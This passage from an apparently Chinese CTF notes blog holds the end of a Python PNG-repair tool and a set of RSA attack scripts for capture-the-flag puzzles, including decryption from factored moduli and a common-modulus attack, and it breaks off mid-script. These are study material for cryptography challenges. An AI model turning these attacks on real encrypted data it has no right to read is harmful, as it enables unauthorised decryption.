class="number">12</span> - pos - <span class="number">12</span>))</span><br><span class="line">                error_level = max(error_level, <span class="number">2</span>)</span><br><span class="line">                suggestions.append(<span class="string">'printf "&#123;&#125;" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(</span><br><span class="line">                    str_to_hex(struct.pack(<span class="string">'&gt;I'</span>, len(png) - <span class="number">12</span> - pos - <span class="number">12</span>)),</span><br><span class="line">                    args.png, pos, <span class="number">4</span>))</span><br><span class="line">                suggestions_level.append(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        calculated_crc = binascii.crc32(c_type + c_data) % (<span class="number">1</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">if</span> c_crc != <span class="string">'&#123;:08x&#125;'</span>.format(calculated_crc).decode(<span class="string">'hex'</span>):</span><br><span class="line">            <span class="comment"># print '111\n', c_crc, calculated_crc, '111\n'</span></span><br><span class="line">            c_errors.append(<span class="string">'CRC error (&#123;&#125;), should be: &#123;&#125;'</span>.format(str_to_hex(c_crc), crc_to_hex(calculated_crc)))</span><br><span class="line">            error_level = max(error_level, <span class="number">1</span>)</span><br><span class="line">            suggestions.append(<span class="string">'printf "&#123;&#125;" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(</span><br><span class="line">                crc_to_hex(calculated_crc), args.png, pos + <span class="number">8</span> + c_length, <span class="number">4</span>))</span><br><span class="line">            suggestions_level.append(<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#print c_crc, type(c_crc)</span></span><br><span class="line">            <span class="comment">#print str(binascii.crc32(c_type + c_data) % (1 &lt;&lt; 32)).decode('hex'), type(str(binascii.crc32(c_type + c_data) % (1 &lt;&lt; 32)).decode('hex'))</span></span><br><span class="line">            <span class="comment">#print struct.pack('&lt;i', binascii.crc32(c_type + c_data))</span></span><br><span class="line">            <span class="comment">#print crc_to_hex(binascii.crc32(c_type + c_data) % (1 &lt;&lt; 32)), type(crc_to_hex(binascii.crc32(c_type + c_data) % (1 &lt;&lt; 32)))</span></span><br><span class="line"></span><br><span class="line">        parsed_chunks.append(c_type)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&#123;:&lt;6&#125;&#123;:&lt;15&#125;&#123;:&lt;15&#125;&#123;:&lt;6&#125;&#123;:&lt;15&#125;&#123;:&lt;15&#125;&#123;&#125;'</span>.format(c_id, pos, c_length, c_type, c_crc.encode(<span class="string">'hex'</span>), c_size, <span class="string">' | '</span>.join(c_errors))</span><br><span class="line"></span><br><span class="line">        c_id += <span class="number">1</span></span><br><span class="line">        pos += min(c_size, len(png) - <span class="number">12</span> - pos)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> c_type == <span class="string">'IEND'</span>:</span><br><span class="line">            OK = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Suggestions:'</span></span><br><span class="line">    <span class="comment"># if error_level == 4:</span></span><br><span class="line">    <span class="comment">#     suggestions = filter(lambda x: 'Invalid file header' in x, suggestions)</span></span><br><span class="line">    <span class="comment"># elif error_level == 3:</span></span><br><span class="line">    <span class="comment">#     suggestions = filter(lambda x: 'Invalid chunk type' in x, suggestions)</span></span><br><span class="line">    <span class="comment"># elif error_level == 2:</span></span><br><span class="line">    <span class="comment">#     suggestions = filter(lambda x: 'Invalid chunk length' in x, suggestions)</span></span><br><span class="line">    <span class="comment"># elif error_level == 1:</span></span><br><span class="line">    <span class="comment">#     suggestions = filter(lambda x: 'CRC error' in x, suggestions)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, (s, sl) <span class="keyword">in</span> enumerate(zip(suggestions, suggestions_level)):</span><br><span class="line">        <span class="keyword">if</span> sl == error_level:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'&#123;&#125;'</span>.format(s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> error_level &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Please run the tool again after applying the corrections'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'PNG parser.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'png'</span>, type=str, help=<span class="string">'corrupted png file'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-v'</span>, <span class="string">'--verbose'</span>, action=<span class="string">'store_true'</span>, help=<span class="string">'add verbosity'</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">print</span> args</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="RSA解密脚本系列"><a href="#RSA解密脚本系列" class="headerlink" title="RSA解密脚本系列"></a>RSA解密脚本系列</h2><h3 id="rsa解密模板"><a href="#rsa解密模板" class="headerlink" title="rsa解密模板"></a>rsa解密模板</h3><p>以文本形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment">#power by jedi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">n = <span class="number">966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533</span></span><br><span class="line"><span class="comment"># p 和 q通过在线网站http://factordb.com/index.php分解</span></span><br><span class="line">p = gmpy2.mpz(<span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473</span>)</span><br><span class="line">q = gmpy2.mpz(<span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">65537</span>)</span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">c = gmpy2.mpz(<span class="number">168502910088858295634315070244377409556567637139736308082186369003227771936407321783557795624279162162305200436446903976385948677897665466290852769877562167487142385308027341639816401055081820497002018908896202860342391029082581621987305533097386652183849657065952062433988387640990383623264405525144003500286531262674315900537001845043225363148359766771033899680111076181672797077410584747509581932045540801777738548872747597899965366950827505529432483779821158152928899947837196391555666165486441878183288008753561108995715961920472927844877569855940505148843530998878113722830427807926679324241141182238903567682042410145345551889442158895157875798990903715105782682083886461661307063583447696168828687126956147955886493383805513557604179029050981678755054945607866353195793654108403939242723861651919152369923904002966873994811826391080318146260416978499377182540684409790357257490816203138499369634490897553227763563553981246891677613446390134477832143175248992161641698011195968792105201847976082322786623390242470226740685822218140263182024226228692159380557661591633072091945077334191987860262448385123599459647228562137369178069072804498049463136233856337817385977990145571042231795332995523988174895432819872832170029690848</span>)</span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(<span class="string">"十进制:\n%s"</span>%m)</span><br><span class="line">m_hex = hex(m)[<span class="number">2</span>:]</span><br><span class="line">print(<span class="string">"十六进制:\n%s"</span>%(m_hex,))</span><br><span class="line"><span class="comment">#print("ascII:\n%s"%((binascii.b2a_hex(hex(m)[2:])).decode('hex'),))</span></span><br><span class="line">print(<span class="string">"ascii:\n%s"</span>%(binascii.a2b_hex(m_hex).decode(<span class="string">"utf8"</span>),))</span><br></pre></td></tr></table></figure></p>
<p>以文件形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#power by jedi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment">#1.从公钥文件中分解n和e</span></span><br><span class="line">public_key = RSA.importKey(open(<span class="string">"./tmp/pubkey.pem"</span>).read())</span><br><span class="line">n = public_key.n</span><br><span class="line">e = public_key.e</span><br><span class="line"><span class="comment">#print("n=\n%s\ne=\n%s"%(n,e))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.在线分解n得到p和q</span></span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.计算出d</span></span><br><span class="line">d = int(gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br><span class="line"><span class="comment">#print(d)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过已知条件，生成私钥，并解密密文</span></span><br><span class="line">private_key = rsa.PrivateKey(n, e, d, p, q)<span class="comment">#生成私钥</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./tmp/flag.enc"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = rsa.decrypt(f.read(), private_key)</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="comment">#print(rsa.decrypt(f.read(), private_key).decode())</span></span><br></pre></td></tr></table></figure></p>
<h3 id="e-65537-已知cepq求m"><a href="#e-65537-已知cepq求m" class="headerlink" title="e=65537(已知cepq求m)"></a>e=65537(已知cepq求m)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(c,e,p,q)</span>:</span></span><br><span class="line">    L=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    d=gmpy2.invert(e,L)</span><br><span class="line">    n=p*q</span><br><span class="line">    m=gmpy2.powmod(c,d,n)</span><br><span class="line">    flag=str(m)</span><br><span class="line">    print(<span class="string">"flag&#123;"</span>+flag+<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p =  <span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221</span></span><br><span class="line">    q =  <span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473</span></span><br><span class="line">    e =  <span class="number">65537</span></span><br><span class="line">    c =  <span class="number">168502910088858295634315070244377409556567637139736308082186369003227771936407321783557795624279162162305200436446903976385948677897665466290852769877562167487142385308027341639816401055081820497002018908896202860342391029082581621987305533097386652183849657065952062433988387640990383623264405525144003500286531262674315900537001845043225363148359766771033899680111076181672797077410584747509581932045540801777738548872747597899965366950827505529432483779821158152928899947837196391555666165486441878183288008753561108995715961920472927844877569855940505148843530998878113722830427807926679324241141182238903567682042410145345551889442158895157875798990903715105782682083886461661307063583447696168828687126956147955886493383805513557604179029050981678755054945607866353195793654108403939242723861651919152369923904002966873994811826391080318146260416978499377182540684409790357257490816203138499369634490897553227763563553981246891677613446390134477832143175248992161641698011195968792105201847976082322786623390242470226740685822218140263182024226228692159380557661591633072091945077334191987860262448385123599459647228562137369178069072804498049463136233856337817385977990145571042231795332995523988174895432819872832170029690848</span></span><br><span class="line">    Decrypt(c,e,p,q)</span><br></pre></td></tr></table></figure>
<h3 id="共模攻击-已知n-e1-e2-c1-c2求m"><a href="#共模攻击-已知n-e1-e2-c1-c2求m" class="headerlink" title="共模攻击(已知n,e1,e2,c1,c2求m)"></a>共模攻击(已知n,e1,e2,c1,c2求m)</h3><p>以文本形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  n = <span class="number">116547141139745534253172934123407786743246513874292261984447028928003798881819567221547298751255790928878194794155722543477883428672342894945552668904410126460402501558930911637857436926624838677630868157884406020858164140754510239986466552869866296144106255873879659676368694043769795604582888907403261286211</span></span><br><span class="line">  c1 = <span class="number">78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853</span></span><br><span class="line">  c2 = <span class="number">98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201</span></span><br><span class="line">  e1 = <span class="number">1804229351</span></span><br><span class="line">  e2 = <span class="number">17249876309</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line">  print(n2s(m))  <span class="comment"># 二进制转string</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></p>
<p>以文件形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># 文件类型</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> g, x - b // a * y, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'flag.enc1'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        c1 = f1.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">        c1 = string.atoi(c1, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'flag.enc2'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        c2 = f2.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">        c2 = string.atoi(c2, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    n = <span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span></span><br><span class="line"></span><br><span class="line">    e1 = <span class="number">17</span></span><br><span class="line">    e2 = <span class="number">65537</span></span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求模反元素</span></span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = -s1</span><br><span class="line">        c1 = gmpy.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = -s2</span><br><span class="line">        c2 = gmpy.invert(c2, n)</span><br><span class="line"></span><br><span class="line">    m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'&#123;:x&#125;'</span>.format(int(m)).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<h3 id="已知n-e-c求m"><a href="#已知n-e-c求m" class="headerlink" title="已知n,e,c求m"></a>已知n,e,c求m</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastExpMod</span><span class="params">(b, e, m)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    e = e0*(2^0) + e1*(2^1) + e2*(2^2) + ... + en * (2^n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    b^e = b^(e0*(2^0) + e1*(2^1) + e2*(2^2) + ... + en * (2^n))</span></span><br><span class="line"><span class="string">        = b^(e0*(2^0)) * b^(e1*(2^1)) * b^(e2*(2^2)) * ... * b^(en*(2^n))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    b^e mod m = ((b^(e0*(2^0)) mod m) * (b^(e1*(2^1)) mod m) * (b^(e2*(2^2)) mod m) * ... * (b^(en*(2^n)) mod m) mod m</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (e&amp;<span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># ei = 1, then mul</span></span><br><span class="line">            result = (result * b) % m</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="comment"># b, b^2, b^4, b^8, ... , b^(2^n)</span></span><br><span class="line">        b = (b*b) % m</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(C, d, n)</span>:</span></span><br><span class="line">    <span class="comment">#RSA M = C^d mod n</span></span><br><span class="line">    <span class="keyword">return</span> fastExpMod(C, d, n)</span><br><span class="line"></span><br><span class="line">p = <span class="number">13574881</span></span><br><span class="line">q = <span class="number">23781539</span></span><br><span class="line">n = p * q</span><br><span class="line">fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">23</span></span><br><span class="line">d = libnum.invmod(e,fn)</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">C = int(<span class="string">'0xdc2eeeb2782c'</span>, <span class="number">16</span>)</span><br><span class="line">M = decryption(C, d, n)</span><br><span class="line">flag = str(hex(M))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> flag.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="已知n-c-e-1"><a href="#已知n-c-e-1" class="headerlink" title="已知n,c,e=1"></a>已知n,c,e=1</h3><p>文本形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N_hex=<span class="number">0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcd</span></span><br><span class="line">e_hex=<span class="number">0x1</span></span><br><span class="line">c_hex=<span class="number">0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797d</span></span><br><span class="line"></span><br><span class="line">c_hex = gmpy2.mpz(c_hex)</span><br><span class="line">N_hex = gmpy2.mpz(N_hex)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">10</span>:</span><br><span class="line">    m_hex = hex(c_hex + gmpy2.mpz(hex(i))*N_hex)</span><br><span class="line">    print(m_hex[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(binascii.a2b_hex(m_hex[<span 